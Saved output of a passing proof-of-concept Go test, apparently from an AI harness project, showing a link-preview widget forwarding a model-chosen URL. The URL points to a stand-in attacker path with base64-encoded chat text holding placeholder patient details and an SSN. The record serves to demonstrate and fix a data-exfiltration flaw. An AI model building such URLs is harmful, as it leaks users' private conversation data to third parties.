@@ -1,0 +1,5 @@
+=== RUN   TestPoC_LinkPreviewWidgetForwardsModelChosenURL
+    poc_exfil_test.go:345: metadata enclave received POST /metadata with url=https://github.com/attacker/collect?d=W3VzZXJdIG15IHBhdGllbnQgSm9obiBRLiBQdWJsaWMsIFNTTiAxMjMtNDUtNjc4OQ
+--- PASS: TestPoC_LinkPreviewWidgetForwardsModelChosenURL (0.03s)
+PASS
+ok  	github.com/tinfoilsh/confidential-tinfoil-harness	0.054s
